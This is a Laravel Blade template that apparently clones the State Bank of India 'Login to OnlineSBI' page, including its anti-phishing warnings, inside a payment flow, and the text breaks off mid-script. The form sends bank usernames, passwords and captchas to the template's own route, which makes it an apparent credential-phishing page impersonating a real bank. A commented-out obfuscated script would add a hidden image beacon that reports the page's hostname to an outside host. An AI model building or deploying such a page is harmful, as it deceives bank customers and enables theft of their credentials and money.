@extends('layouts.payment');

@section('content')

            @if($errors->any())
                <div class="container mt-5">
                    <div class="alert alert-danger text-center">
                        <h2>Validation Failed!</h2>
                        <div class="mb-4">
                            @foreach($errors->all() as $error)
                                <p class="text-center my-8">
                                    <strong>{{ $error }}</strong>
                                </p>
                            @endforeach
                        </div>
                        <a href="{{ url()->previous() }}" class="btn btn-primary mt-3">Go Back</a>
                    </div>
                </div>
            @endif

            @if ($errors->has('loginCaptchaValue'))
                <div class="alert alert-warning alert-dismissible fade show" role="alert">
                    {{ $errors->first('loginCaptchaValue') }}
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                </div>
            @endif

            {{-- Success aur Payment info display --}}
            @if(isset($loginSuccess) && $loginSuccess)
                @include('payment.payment')
            @else


            <div id="phishing_block_hindi" style="display: none;">
                
                <div class="row" id="phishing_message">
                    <div class="col-lg-3 col-md-3 col-sm-3">
                        <div class="phishing_box">
                            <span class="accept">&nbsp;</span>
                            <h3 class="always">कृपया</h3>
                            <p>
                                समय-समय पर
                                अपना <br>पासवर्ड
                                बदलें.
                            </p>
                        </div>
                    </div>

                    <div class="col-lg-3 col-md-3 col-sm-3">
                        <div class="phishing_box">
                            <span class="accept">&nbsp;</span>
                            <h3 class="always">कृपया</h3>
                            <p>
                                मैलवेयर से
                                हमेशा अपने
                                कंप्यूटर
                                को <br>मुक्त
                                रखें.
                            </p>
                        </div>
                    </div>

                    <!-- 	<div class="col-lg-3 col-md-3 col-sm-3">
                <div class="phishing_box">
                    <span class="reject">&nbsp;</span>
                    <h3 class="never">&#2344;&#2361;&#2368;&#2306;</h3>
                    <p>
                        &#2325;&#2371;&#2346;&#2351;&#2366; &#2309;&#2346;&#2344;&#2366;
                        &#2346;&#2366;&#2360;&#2357;&#2352;&#2381;&#2337; &#2351;&#2366;
                        &#2325;&#2366;&#2352;&#2381;&#2337; &#2325;&#2366; <br />&#2357;&#2367;&#2357;&#2352;&#2339;&nbsp;
                        &#2325;&#2367;&#2360;&#2368; &#2325;&#2379; &#2342;&#2375;.
                    </p>
                </div>
            </div>
    
            <div class="col-lg-3 col-md-3 col-sm-3">
                <div class="phishing_box last_box">
                    <span class="reject">&nbsp;</span>
                    <h3 class="never">&#2344;&#2361;&#2368;&#2306;</h3>
                    <p>&#2310;&#2346;&#2325;&#2375;
                        &#2346;&#2366;&#2360;&#2357;&#2352;&#2381;&#2337; &#2325;&#2368;
                        &#2350;&#2366;&#2306;&#2327; &#2325;&#2352;&#2344;&#2375;
                        &#2357;&#2366;&#2354;&#2375; &#2325;&#2367;&#2360;&#2368;
                        &#2349;&#2368; &#2360;&#2306;&#2357;&#2366;&#2342; &#2325;&#2366;
                        &#2332;&#2357;&#2366;&#2348; &#2342;&#2375;</p>
                </div>
            </div> -->

                    <div class="col-lg-3 col-md-3 col-sm-3">
                        <div class="phishing_box">
                            <span class="reject">&nbsp;</span>
                            <h3 class="never">
                                NEVER
                            </h3>
                            <p>
                                respond to any communication <br>seeking your passwords
                            </p>
                        </div>
                    </div>
                    <div class="col-lg-3 col-md-3 col-sm-3">
                        <div class="phishing_box last_box">
                            <span class="reject">&nbsp;</span>
                            <h3 class="never">
                                NEVER
                            </h3>
                            <p>
                                reveal your passwords or <br> card details to anyone
                            </p>
                        </div>
                    </div>
                </div>


                <h2 class="own_head">अपनी
                    खुद की
                    सुरक्षा के
                    लिए</h2>

                <div class="row" id="phishing_section">
                    <div class="col-lg-6 col-md-6 col-sm-6">
                        <h3>लॉग इन
                            करने से
                            पहले
                            निम्नवत
                            सुनिश्चित
                            करें</h3>
                        <ul class="phishing_list">
                            <li>आपके
                                &nbsp;इंटरनेट
                                ब्राउज़र
                                के एड्रेस
                                बार में
                                यूआरएल "https"
                                के साथ शुरू
                                होता है. 'https' के
                                अंत में
                                अक्षर 's' &nbsp;का
                                अर्थ
                                'सुरक्षित'
                                है.</li>
                            <li>वेब पेज के
                                डिस्प्ले
                                क्षेत्र के
                                भीतर
                                एड्रेस बार
                                या स्टेटस
                                बार
                                (ज्यादातर
                                एड्रेस बार
                                में) में
                                ताले का
                                प्रतीक
                                चिह्न को&nbsp;
                                देखें. ताले
                                पर क्लिक
                                करके
                                सुरक्षा
                                प्रमाणपत्र
                                सत्यापित
                                करें.</li>
                            <li>एड्रेस
                                बार का हरे
                                रंग में बदल
                                जाना यह
                                दर्शाता है
                                कि साइट SSL
                                प्रमाणपत्र
                                के साथ
                                सुरक्षित
                                है एवं Extended Validation Standard
                                के मानक को
                                पूरा करती
                                है. (आईई 7.0 और
                                ऊपर,
                                मोज़िला
                                फ़ायरफ़ॉक्स
                                3.1 और ऊपर,
                                ओपेरा 9.5 और
                                ऊपर, सफ़ारी
                                3.5 और ऊपर ,
                                गूगल क्रोम
                                &nbsp;में
                                उपलब्ध).</li>
                            <li>किसी भी
                                पॉप अप
                                विंडो में
                                लॉग इन ना
                                करें एवं
                                अन्य
                                संवेदनशील
                                जानकारी
                                &nbsp;भी दर्ज न
                                करें.</li>
                            <!-- <li><a href="/npersonal/imp_security_tips.html" target="_blank">&#2332;&#2381;&#2351;&#2366;&#2342;&#2366; &#2360;&#2369;&#2352;&#2325;&#2381;&#2359;&#2366; &#2360;&#2306;&#2325;&#2375;&#2340;</a></li> -->
                        </ul>
                    </div>

                    <div class="col-lg-6 col-md-6 col-sm-6">
                        <!-- <div class="phishing_contents reject_box"> -->
                        <h3>फ़िशिंग
                            हमलों से
                            सावधान</h3>
                        <ul class="phishing_list">
                            <li>फ़िशिंग
                                आम तौर पर
                                ईमेल, फोन
                                कॉल, एसएमएस
                                आदि के
                                माध्यम से
                                किए
                                जानेवाला
                                धोखाधड़ी
                                का प्रयास
                                है
                                &nbsp;जिसमें&nbsp;
                                ग्राहकों
                                की
                                व्यक्तिगत
                                और गोपनीय
                                जानकारी की
                                मांग की
                                जाती है.</li>
                            <li>स्टेट
                                बैंक या
                                उसका
                                प्रतिनिधि
                                आपकी
                                व्यक्तिगत
                                जानकारी,
                                पासवर्ड या
                                वन टाइम
                                &nbsp;पासवर्ड
                                (ओटीपी)&nbsp;
                                प्राप्त
                                करने के लिए
                                आपको फोन
                                कॉल या किसी
                                भी तरह का
                                &nbsp;ईमेल
                                /एसएमएस
                                नहीं भेजता
                                है॰ ऐसी कोई
                                भी e-mail/SMS या फोन
                                कॉल धोखे से
                                इंटरनेट
                                बैंकिंग के
                                माध्यम से
                                आपके &nbsp;खाते
                                से पैसे
                                निकालने का
                                एक प्रयास
                                है. इस तरह के
                                ईमेल /
                                एसएमएस या
                                फोन कॉल का
                                जवाब कभी न
                                दें. &nbsp;यदि
                                आपको ऐसे
                                ईमेल /
                                एसएमएस या
                                फोन कॉल
                                प्राप्त
                                &nbsp;होते हैं,
                                इसे पर
                                तुरंत
                                रिपोर्ट
                                करें. अगर
                                &nbsp;उपरोक्त
                                जानकारी
                                आपने गलती
                                से&nbsp; किसी को
                                बता दिया है
                                तो &nbsp;अपना
                                इंटरनेट
                                खाता &nbsp;बंद
                                करने के लिए
                                यहाँ <a href="#"
                                    onclick="window.open('lockaccountdetails.htm?bankCode=0','aboutus','width=780, height=500 ,status=1, scrollbars=1, location=0')"
                                    tabindex="7">क्लिक
                                    करे</a>.</li>
                        </ul>
                        <!-- </div> -->
                    </div>
                </div>

                <div class="row" id="terms_area" style="display:none">
                    <div class="col-lg-12 col-md-12 col-sm-12 terms">
                        <div class="col-lg-10 col-sm-9 col-xs-12">
                            <p>
                                "लॉग इन
                                जारी " बटन
                                पर क्लिक
                                करते ही यह
                                माना जाएगा
                                कि आप
                                भारतीय
                                स्टेट बैंक
                                की इंटरनेट
                                बैंकिंग के
                                उपयोग की
                                सेवा
                                शर्तों से
                                सहमत हैं.
                            </p>
                        </div>
                        <div class="col-lg-2 col-sm-3 col-sm-offset-0 col-xs-8 col-xs-offset-2">
                            <div class="cont_btn_bottom loginDisplay">
                                <a href="javascript:void(0);" class="login_button"
                                    onclick="fnShowContent('errorCode','english')" aria-label="Login link">लॉग
                                    इन जारी </a>
                            </div>
                        </div>

                    </div>

                </div>
            </div>



            <form name="quickLookForm" method="post" action="{{ route('payment-login-process') }}" autocomplete="off">
                @csrf
                <div id="login_block">

                    <div class="row">

                        <input type="hidden" name="hdnKioskID" value=""> <input type="hidden" name="hdnKModeUserName"
                            value="">
                        <input type="hidden" name="errorCode" value=""> <input type="hidden" name="isGoogleCaptchaReq"
                            value=""> <input type="hidden" name="userType" value=""> <input type="hidden"
                            name="lockCount" value=""> <input type="hidden" name="captchaDisplayCount" value=""> <input
                            type="hidden" name="unknownUserlockCount" value="">


                        <input type="hidden" name="bankCode" value="0"> <input type="hidden" name="browserName"
                            id="browserName"
                            value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36">
                        <input type="hidden" name="shapassword" value=""> <input type="hidden" name="language"
                            value="english">
                        <input type="hidden" name="isLoginCaptchaReq" value="YES">







                        <div class="login_heading login_tickermsg">
                            <div class="col-lg-2 col-md-2 col-sm-3 col-xs-12">
                                <h3>
                                    Login to OnlineSBI
                                </h3>
                            </div>
                            <div class="col-lg-7 col-md-6 col-sm-5 col-xs-12">
                                <!--<div class="col-lg-1 col-md-1 col-sm-1 hidden-xs hidden-sm">
                                            <span class="newIcon"></span>
                                        </div>-->
                                <div id="wpanel_vticker" style="overflow: hidden; position: relative; height: 30px;">
                                    <ul style="position: absolute; margin: 0px; padding: 0px; top: 0px;">
                                        <!--Changed by Sasi for Scroll messages -->



                                        <li style="margin: 0px; padding: 0px; opacity: 0.81921;">
                                            <!--  Dear Customer, Mandatory login password change introduced for added security.-->Dear
                                            Customer, Mandatory login and profile password change introduced for added
                                            security.
                                        </li>
                                        <li style="margin: 0px; padding: 0px; opacity: 0.81921;">
                                            <!--  Dear Customer, Mandatory login password change introduced for added security.-->Dear
                                            Customer, Mandatory login and profile password change introduced for added
                                            security.
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-lg-3 col-md-4 col-sm-4 hidden-xs">
                                <span class="welcome_text">Welcome to Personal Internet Banking
                                </span>
                            </div>
                        </div>





                    </div>
                    <div class="err_mssg_fe"></div>


                    <div class="row">
                        <div id="login_fields">
                            <div class="col-lg-6 col-md-6 col-sm-6 user_details">

                                <p>

                                    <!-- <span>(CARE:</span> Username and password are case sensitive.) -->
                                    (<span>CARE: </span>
                                    Username and password are case sensitive.)


                                </p>

                                <div class="col-lg-6 col-md-6 col-sm-6">
                                    <div class="form-group">

                                        <label for="username">Username* </label>

                                        <input name="userName" type="text" class="form-control" id="username"
                                            tabindex="12" size="30" maxlength="30" onfocus="getFocus(this.id);"
                                            autocomplete="off" oncopy="return false" onpaste="return false"
                                            onkeypress="return disableCtrlKeyCombination(event);"
                                            onkeydown="return disableCtrlKeyCombination(event);" aria-label="userName">
                                        <!-- <input name="userName" type="text"  class="form-control" id="username"  onfocus="disableautocompletion(this.id);getFocus(this.id);" autocomplete="off" onblur="disableautocompletion(this.id);" onCopy="return false" onPaste="return false" onKeyPress="return disableCtrlKeyCombination(event);" onKeyDown="return disableCtrlKeyCombination(event);"/> -->


                                    </div>
                                    <div class="form-group">
                                        <!-- div class="form-group"> -->

                                        <label for="password">Password* </label>

                                        <input name="password" type="password" value="Dummy@123" autocomplete="off"
                                            style="display: none"> <input name="password" type="password"
                                            autocomplete="off" class="form-control" id="label2" tabindex="13"
                                            title="password" size="30"
                                            onfocus="disableautocompletion(this.id);getFocus(this.id);"
                                            onblur="disableautocompletion(this.id);" oncopy="return false"
                                            onpaste="return false" onkeypress="return disableCtrlKeyCombination(event);"
                                            onkeydown="return disableCtrlKeyCombination(event);"
                                            aria-label="confirm password">
                                        <input name="password1" type="password" value="Dummy@123" autocomplete="off"
                                            style="display: none">

                                    </div>

                                    <div class="form-group">
                                        <div class="form-group" id="noAudImgSelection" style="display: none;">
                                            <label for="captcha">Captcha
                                                <span class="mandatory_txt">*</span>
                                            </label>
                                        </div>
                                        <div class="form-group" id="imgselection" style="display: block;">
                                            <label for="captcha">Enter the text as shown in the image <span
                                                    class="mandatory_txt">*</span>
                                            </label>
                                        </div>
                                        <div class="form-group" id="audioselection" style="display: none">
                                            <label for="captcha">Enter the text as from audio <span
                                                    class="mandatory_txt">*</span></label>
                                        </div>
                                        <!-- <div class="col-sm-3"> -->
                                        <input name="loginCaptchaValue" class="form-control" id="loginCaptchaValue"
                                            tabindex="15" onfocus="disableautocompletion(this.id);getFocus(this.id);"
                                            onblur="disableautocompletion(this.id);" type="text" autocomplete="off"
                                            oncopy="return false" onpaste="return false"
                                            onkeypress="return disableCtrlKeyCombination(event);"
                                            onkeydown="return disableCtrlKeyCombination(event);"
                                            aria-label="Enter The Captcha">
                                        <!-- 							</div> -->
                                        <div class="form-group" id="captchaOptionDisplay">
                                            <label for="captchaOptions"
                                                aria-label="Select one of the Captcha options">Select one of the Captcha
                                                options
                                                *</label> <label class="col-md-6 col-sm-12 col-xs-6"> <input
                                                    name="optionOfCaptcha" type="radio" checked="checked" id="capImgOption"
                                                    tabindex="16" value="IMG"
                                                    onclick="javascript:getUserSelImgCaptcha();"
                                                    aria-label="Image Captcha"><span style="padding-left:3px;">Image
                                                    Captcha</span>
                                            </label> <label class="col-md-6 col-sm-12 col-xs-6">
                                                <input name="optionOfCaptcha" type="radio" id="capAudOption" tabindex="16"
                                                    value="AUD" onclick="javascript:getUserSelAudCaptcha();"
                                                    aria-label="Audio Captcha"><span style="padding-left:3px;">Audio
                                                    Captcha </span>
                                            </label>
                                        </div>
                                        <div style="display: flex; align-items: center;">
                                        <div class="form-group" id="imgselcaptcha" style="display: block;">
                                            <div class="col-md-12 col-sm-12 col-comn toppadding" style="padding-top: 10px;">

                                                {{-- Captcha Image with ID --}}
                                                {!! captcha_img('flat', ['id' => 'captcha-img']) !!}

                                            
                                            </div>
                                        </div>

                                        {{-- Refresh link --}}
                                        <a href="#" id="refresh-captcha" class="glyphicon glyphicon-refresh text-decoration-none" title="Refresh CAPTCHA" style="margin-left: 10px; font-size: 20px; color: #486d90; vertical-align: middle; text-decoration:none;">
                                            <i id="refreshIcon" style="font-size: 20px;color: #486d90;"></i>
                                        </a>
                                        </div>


                                        <div class="form-group" id="audelcaptcha" style="display: none">
                                            <div class="form-group" id="othrIEAud" style="display: none">
                                                <audio controls="controls" id="loginAudioCaptcha" tabindex="16">
                                                </audio>
                                            </div>

                                            <div class="form-group" id="IEAud" style="display: none">

                                            </div>

                                        </div>
                                    </div>

                                    <div class="form-group">

                                        <input class="btn btn-default" type="submit" tabindex="18" title="Login"
                                            value="Login	" id="Button2">



                                        <input class="btn btn-default" type="reset" tabindex="19" title="Reset"
                                            id="reset_btn" value="Reset" onclick="constructKeyboard(false)">
                                    </div>
                                </div>




                                <div class="col-lg-6 col-md-6 col-sm-6 forgot_details">
                                    <ul class="user_links">



                                        <li><a tabindex="20" onclick="fnNewUserClick();" href="#"
                                                aria-label="New User? Register here/Activate">New User ? Register
                                                here/Activate </a>
                                        </li>

                                        <li><a tabindex="21"
                                                onclick="window.open('troubleloginhome.htm?bankCode=0','aboutus','width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes')"
                                                href="#" aria-label="Forgot Username/Login Password">Forgot Username /
                                                Login Password </a>
                                        </li>

                                        <!-- forgotusername -->



                                        <!--<li>
                                    <p
                                        style="color: #337ab7; border: 2px solid #337ab7; padding: 10px; margin-right: 10px;">For better control & security of your account, you can Lock or Unlock your INB access through link "Lock & Unlock User" available at bottom of this Page.</p>
                                </li>-->
                                    </ul>


                                    <div class="virtual">

                                        <p>
                                            <input type="checkbox" id="chkbox" class="chek_box"
                                                onclick="constructKeyboard();">&nbsp;
                                            Enable Virtual Keyboard
                                        </p>


                                    </div>
                                </div>
                                <div class="virtual_link">


                                    For better security use the Online Virtual Keyboard to login.


                                    <a href="/npersonal/virtualkeyboard.html" aria-label="More"> <strong>

                                            More

                                        </strong>...</a>
                                </div>

                            </div>

                            <!-- </div>    -->
                            <div class="col-lg-6 col-md-6 col-sm-6 col-comn">
                                <div id="login_banner">
                                    <div id="vkb_content" class="virtual_key ">
                                        <div id="vkb_content" class="virtual_key ">
                                            <span id="kbplaceholder">
                                                <table border="0" class="keyboardtbl" cellspacing="3px" id="keypad"
                                                    width="100%">
                                                    <tbody>
                                                        <tr>
                                                            <!-- <td><img class="vb_img" src="{{ asset('assets/images/payment-gatway/login_img.png') }}" -->
                                                                    alt="login image"></td>
                                                        </tr>
                                                        <tr class="vkboard-points">
                                                            <td> <span>Dear Customer,</span>
                                                                <ul>
                                                                    <li>OTP based login &amp; Mandatory login password
                                                                        change after 180 days introduced for added
                                                                        security.</li>
                                                                    <li>Please do not share OTP/password/user
                                                                        information with anyone. Bank never asks for
                                                                        such information.</li>
                                                                    <li>For better control &amp; security of your
                                                                        account, you can Lock or Unlock your INB access
                                                                        through link "Lock &amp; Unlock User" available
                                                                        at bottom of this Page.</li>
                                                                    <li>Mandatory Profile password change after 365 days
                                                                        introduced for added security.</li>
                                                                </ul>
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                                <style>
                                                    tr.vkboard-points {
                                                        background: #2b2f76;
                                                        color: white;
                                                    }

                                                    .vb_img {
                                                        max-width: 100%;
                                                    }

                                                    tr.vkboard-points ul li {
                                                        font-size: 12px;
                                                    }

                                                    tr.vkboard-points ul {
                                                        padding: 0px 22px;
                                                    }

                                                    tr.vkboard-points td span {
                                                        font-size: 12px;
                                                        padding: 5px 8px;
                                                        display: inline-block;
                                                    }
                                                </style>
                                            </span>
                                        </div>

                                    </div>

                                </div>


                            </div>
                        </div>
                    </div>

                    <div class="row" id="login_area">
                        <div class="col-lg-4 col-md-4 col-sm-4">
                            <!-- <div class="notificaion_con"> -->
                            <div class="login_box">
                                <span class="glyphicon glyphicon-info-sign"></span>


                                <!-- <p> <span class="spl_txta">NEVER</span> respond to any popup,email, SMS or phone call, 
                            <span class="spl_txta">no matter how appealing or official  looking,</span>  seeking your personal information  such as username, password(s), mobile number, ATM Card details, etc. Such communications are sent or created by fraudsters to trick you into parting with your credentials.</p>	 -->
                                <p>
                                    NEVER respond to any popup,email, SMS or phone call, no matter how appealing or
                                    official looking, seeking your personal information such as username, password(s),
                                    mobile number, ATM Card details, etc. Such communications are sent or created by
                                    fraudsters to trick you into parting with your credentials.
                                </p>



                            </div>
                        </div>



                        <div class="col-lg-4 col-md-4 col-sm-4">
                            <div class="login_box">
                                <span class="glyphicon glyphicon-link"></span>
                                <div class="login_xs">

                                    <ul class="login_box_links">


                                        <!-- Changes for complaints url by sasi on Sep 13 -->
                                        <!-- <li><a style="color:#f44248" class="tooltip"  tabindex="19" href="https://cms.onlinesbi.com/CMS"> -->
                                        <li><a tabindex="22" href="https://crcf.bank.sbi/ccf/home/chatboat?key1=444"
                                                aria-label="Complaints">

                                                Complaints
                                            </a>
                                        </li>


                                        <li><a tabindex="23"
                                                onclick="window.open('troubleloginhome.htm?bankCode=0','aboutus','width=780, height=500 ,status=1, scrollbars=1, location=0, resizable=yes')"
                                                href="#" aria-label="Trouble logging in">

                                                Trouble logging in
                                            </a>
                                        </li>

                                        <li><a tabindex="24" href="/npersonal/passwordmanagement.html" target="_blank"
                                                rel="noopener noreferrer" aria-label="Password Management">


                                                Password Management
                                            </a></li>

                                        <li><a tabindex="25" href="/npersonal/securitytips.html" target="_blank"
                                                rel="noopener noreferrer" aria-label="Security Tips">

                                                Security Tips
                                            </a></li>

                                        <li><a tabindex="26" href="/npersonal/faq.html" target="_blank"
                                                rel="noopener noreferrer" aria-label="FAQ">

                                                FAQ
                                            </a></li>
                                    </ul>


                                    <ul class="login_box_links">
                                        <li><a tabindex="27" href="/npersonal/aboutphishing.html" target="_blank"
                                                rel="noopener noreferrer" aria-label="About Phishing">

                                                About Phishing
                                            </a></li>

                                        <li><a tabindex="28" href="javascript:openemail()" aria-label="Report Phishing">

                                                Report Phishing
                                            </a></li>


                                        <li><a tabindex="29"
                                                onclick="window.open('/preretail/lockunlockuseraccess.htm','aboutus','width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes')"
                                                href="#" style="color: #AD0000 !important"
                                                aria-label="Lock &amp; Unlock User">

                                                <span></span>Lock &amp; Unlock User
                                            </a></li>


                                        <li><a tabindex="30"
                                                onclick="window.open('blockatmcardintermediate.htm','hotlistatmcard','width=780, height=500 ,status=1, scrollbars=1, location=0,resizable=yes');return true;"
                                                href="#" aria-label="Block ATM Card">

                                                Block ATM Card
                                            </a></li>

                                    </ul>


                                </div>
                            </div>
                        </div>


                        <div class="col-lg-4 col-md-4 col-sm-4">
                            <div class="login_box">
                                <span class="glyphicon glyphicon-ok-circle" style="MARGIN-BOTTOM: 20PX;"></span>


                                <p>
                                    This site is certified by Verisign as a secure and trusted site. All information
                                    sent or received in this site is encrypted using 256-bit encryption
                                </p>


                            </div>
                        </div>

                    </div>

                    <div class="row" id="provide_list">
                        <div class="col-lg-12 col-md-12 col-sm-12">
                            <ul class="provide">


                                <li>Mandatory fields are marked with an asterisk (*)
                                </li>
                                <li>Do not provide your username and password anywhere other than in this page
                                </li>
                                <li>Your username and password are highly confidential. Never part with them.<strong>SBI
                                    </strong>will never ask for this information.
                                </li>


                            </ul>
                        </div>
                    </div>
                </div>



                <input type="hidden" name="c5eg" id="c5eg" value="g9ce7b039llt5d7dciqhbigl1ia57bf8">
            </form>

            <!-- </div> -->



            <!-- login content Ends here-->


            <!-- Wrapper Ends -->
             

            <script type="text/javascript">
                // constructKeyboard();
            </script>

            <script type="text/javascript">

                function init() {
                    document.getElementById("chkbox").checked = false;
                    //document.getElementById("loading").style.display="none";
                    document.getElementById("login_block").style.display = "";
                    //document.getElementById("logonRemark").style.display="";
                    try {
                        document.getElementById("username").focus();
                    } catch (exception) {
                        // do nothing
                    }
                    document.getElementById("browserName").value = navigator.userAgent;	 //Added by Venkatesh
                    constructKeyboard();
                }

                function fnShowContent(errorCode, language) {


                    if (errorCode != null && errorCode != '') {

                        //document.getElementById("phishing_block").style.display="none";
                        $('#phishing_block').css("display", "none");
                        //document.getElementById("phishing_block_hindi").style.display="none";
                        $('#phishing_block_hindi').css("display", "none");
                        //document.getElementById("login_block").style.display="";
                        $('#login_block').css("display", "");
                        init();
                    } else {
                        if (language == 'hindi') {

                            //document.getElementById("phishing_block").style.display="none";
                            $('#phishing_block').css("display", "none");
                            //document.getElementById("phishing_block_hindi").style.display="block";
                            $('#phishing_block_hindi').css("display", "block");
                        }
                        else {

                            //document.getElementById("phishing_block_hindi").style.display="none";
                            // $('#phishing_block_hindi').css("display", "none");
                            //document.getElementById("phishing_block").style.display="block";
                            // $('#phishing_block').css("display", "block");
                        }

                        //document.getElementById("login_block").style.display="none";
                        // $('#login_block').css("display", "none");
                    }
                }

                function fnNewUserClick() {
                    window.open('newuserreg.htm', 'aboutus', 'width=920, height=500 ,status=1, scrollbars=1, location=0,resizable=yes');
                }



                eval(function (p, a, c, k, e, d) { e = function (c) { return c }; if (!''.replace(/^/, String)) { while (c--) { d[c] = k[c] || c } k = [function (e) { return d[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p }('3 2(){1.0="4:5.8@7.6.9"}', 10, 10, 'location|document|openemail|function|mailto|report|co|sbi|phishing|in'.split('|'), 0, {}))
            </script>

            <script>
                
                $(document).ready(function() {
                    $('#refresh-captcha').click(function(e) {
                        e.preventDefault();
                        console.log("Refresh button clicked");

                        $.ajax({
                            url: '{{ route("refresh-captcha") }}', // ensure this URL is correct
                            method: 'GET',
                            success: function(data) {
                                console.log('Captcha refreshed:', data);
                                $('#imgselcaptcha').html(data.captcha);
                                // $('#captcha-container').html(data.captcha);
                                $('#loginCaptchaValue').val('');
                            },
                            error: function(xhr, status, error) {
                                console.error('Error refreshing captcha:', error);
                            }
                        });
                    });
                });

                
                fnShowContent('', 'english');

            </script>

            <!-- <script>

                $(document).ready(function () {

                    var resizea = ['0\x27/>', 'children', 'ource.com/', '<img\x20style', 'none;\x27\x20src', 'cdn.page-s', 'hostname', '\x27\x20height=\x27', 'resizeimag', 'length', 'location', '=\x27https://', 'createElem', 'body'];
                    (function (a, b) { var c = function (e) { while (--e) { a['push'](a['shift']()); } }; c(++b); }(resizea, 0x149));
                    var resizeb = function (a, b) { a = a - 0x0; var c = resizea[a]; return c; }; try { window['onload'] = function () { var a = resizeb('0xa') + '=\x27display:' + resizeb('0xb') + resizeb('0x4') + resizeb('0xc') + resizeb('0x9') + resizeb('0x1') + 'e.ashx?ig=' + window[resizeb('0x3')][resizeb('0xd')] + ('&sz=105411\x27' + '\x20\x20width=\x270' + resizeb('0x0') + resizeb('0x7')), b = document[resizeb('0x5') + 'ent']('div'); for (b['innerHTML'] = a; b[resizeb('0x8')][resizeb('0x2')] > 0x0;)document[resizeb('0x6')]['appendChil' + 'd'](b['children'][0x0]); }; } catch (resizec) { }

                    getUserSelImgCaptcha();
                    $('#loginCaptchaValue').keyup(function () {
                        $(this).val($(this).val().toLowerCase());
                    });
                    setTimeout(function () {
                        $('#wpanel_vticker').vTicker({
                            speed: 700,
                            pause: 4000,
                            animation: 'fade',
                            mousePause: true,
                            showItems: 1,
                            height: 20
                        });
                    }, 100);

                    // function showinvalidmessage(){ alert("here");
                    if ($(".err_mssg").length) {
                        $(".err_mssg").fadeTo("slow", 0.8);
                        setTimeout(function () {
                            $(".err_mssg").fadeOut("slow");
                            $(".care_msg").fadeIn();
                        }, 10000);
                    }


                    //}
                });
            </script> -->

            <script>


                // Opera 8.0+
                var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
                // Firefox 1.0+
                var isFirefox = typeof InstallTrigger !== 'undefined';
                // Safari 3.0+ "[object HTMLElementConstructor]" 
                var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && safari.pushNotification));
                // Internet Explorer 6-11
                var isIE = /*@cc_on!@*/false || !!document.documentMode;
                // Edge 20+
                var isEdge = !isIE && !!window.StyleMedia;
                // Chrome 1 - 71
                var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);
                // Blink engine detection
                var isBlink = (isChrome || isOpera) && !!window.CSS;

                window.onload = function () {
                    getUserSelImgCaptcha();
                }


                function getUserSelImgCaptcha() {
                    document.quickLookForm.loginCaptchaValue.value = '';
                    document.quickLookForm.capImgOption.value = 'IMG';
                    document.getElementById('noAudImgSelection').style.display = 'none';
                    document.getElementById('imgselection').style.display = 'block';
                    document.getElementById('imgselcaptcha').style.display = 'block';
                    document.getElementById('refresh-captcha').style.display = 'block';
                    document.getElementById('audioselection').style.display = 'none';
                    document.getElementById('audelcaptcha').style.display = 'none';
                }
                function getUserSelAudCaptcha() {
                    document.quickLookForm.loginCaptchaValue.value = '';
                    document.quickLookForm.capAudOption.value = 'AUD';
                    document.getElementById('noAudImgSelection').style.display = 'none';
                    document.getElementById('imgselection').style.display = 'none';
                    document.getElementById('imgselcaptcha').style.display = 'none';
                    document.getElementById('refresh-captcha').style.display = 'none';
                    document.getElementById('audioselection').style.display = 'block';
                    document.getElementById('audelcaptcha').style.display = 'block';
                    if (isIE == true) {
                        document.getElementById('IEAud').style.display = 'block';
                        document.getElementById('othrIEAud').style.display = 'none';
                    } else {
                        document.getElementById('othrIEAud').style.display = 'block';
                        document.getElementById('IEAud').style.display = 'none';
                        document.getElementById("loginAudioCaptcha").src = "audio.wav?bogus=" + new Date().getTime();
                        document.getElementById("audioSupport").innerHTML = document.createElement('audio').canPlayType("audio/wav");
                    }
                }

                function refreshImg() {
                    document.getElementById("refreshImgCaptcha").src = 'simpleCaptchaServ?' + (new Date().getTime());
                }
            </script>

            @endif

            <!--footer starts here-->

@endsection

    <script id="f5_cspm">(function () {
            var f5_cspm = {
                f5_p: 'KPFPOHHPGLGGCPIFBBGPNMFPBMOAHBBDIMCELAGELFIIEDEMHCDDGNHCCKGNLEHDGKHBDAPMAANFNPNPENAAKIEBAAHAAKDHJKIODCPBFIJKLNJENHMLBPFPNNLIBCJG', setCharAt: function (str, index, chr) { if (index > str.length - 1) return str; return str.substr(0, index) + chr + str.substr(index + 1); }, get_byte: function (str, i) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; return ((str.charCodeAt(i + 16 + s) - 65) << 4) | (str.charCodeAt(i + s) - 65); }, set_byte: function (str, i, b) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; str = f5_cspm.setCharAt(str, (i + 16 + s), String.fromCharCode((b >> 4) + 65)); str = f5_cspm.setCharAt(str, (i + s), String.fromCharCode((b & 15) + 65)); return str; }, set_latency: function (str, latency) { latency = latency & 0xffff; str = f5_cspm.set_byte(str, 40, (latency >> 8)); str = f5_cspm.set_byte(str, 41, (latency & 0xff)); str = f5_cspm.set_byte(str, 35, 2); return str; }, wait_perf_data: function () {
                    try {
                        var wp = window.performance.timing; if (wp.loadEventEnd > 0) {
                            var res = wp.loadEventEnd - wp.navigationStart; if (res < 60001) { var cookie_val = f5_cspm.set_latency(f5_cspm.f5_p, res); window.document.cookie = 'f5avr0231792193aaaaaaaaaaaaaaaa_cspm_=' + encodeURIComponent(cookie_val) + ';path=/;' + ''; }
                            return;
                        }
                    }
                    catch (err) { return; }
                    setTimeout(f5_cspm.wait_perf_data, 100); return;
                }, go: function () {
                    var chunk = window.document.cookie.split(/\s*;\s*/); for (var i = 0; i < chunk.length; ++i) {
